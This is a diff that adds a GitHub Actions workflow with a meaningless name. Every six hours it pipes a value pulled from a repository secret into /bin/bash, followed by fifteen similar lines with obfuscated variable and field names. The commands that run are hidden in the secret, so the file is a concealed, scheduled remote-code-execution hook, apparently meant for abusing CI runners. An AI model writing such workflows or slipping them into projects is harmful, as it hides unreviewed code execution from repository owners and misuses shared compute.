@@ -1,0 +1,33 @@
+name: camesurfeit
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: camesurfeit
+        env:
+          dg02: ${{ secrets.dg02 }}
+        run: |
+          echo $dg02 | jq -r .jjum16248 | /bin/bash
+          echo $xugo884 | jq -r .a999 | /bin/bash
+          echo $nd8 | jq -r .qm05 | /bin/bash
+          echo $tlt02948 | jq -r .g07011 | /bin/bash
+          echo $v84931 | jq -r .hqym55 | /bin/bash
+          echo $bsj08640 | jq -r .q0800 | /bin/bash
+          echo $box57316 | jq -r .z5 | /bin/bash
+          echo $u6 | jq -r .zofhy9 | /bin/bash
+          echo $c83101 | jq -r .g59 | /bin/bash
+          echo $pgjw325 | jq -r .tm39195 | /bin/bash
+          echo $pi173 | jq -r .u2768 | /bin/bash
+          echo $aau23 | jq -r .t32 | /bin/bash
+          echo $mzsn33 | jq -r .mjqb4 | /bin/bash
+          echo $xusns045 | jq -r .sd33 | /bin/bash
+          echo $kee2 | jq -r .iwvd13725 | /bin/bash
+          echo $o1 | jq -r .wcl5585 | /bin/bash
+
